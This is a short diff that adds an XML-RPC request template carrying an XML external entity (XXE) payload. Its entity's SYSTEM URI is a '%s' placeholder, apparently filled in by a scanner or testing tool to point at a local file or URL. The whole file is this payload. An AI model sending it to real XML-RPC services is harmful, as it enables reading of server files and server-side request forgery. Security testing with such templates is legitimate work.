@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT methodName ANY >
+<!ENTITY xxe SYSTEM "%s" >
+]>
+<methodCall>
+    <methodName>&xxe;</methodName>
+</methodCall>
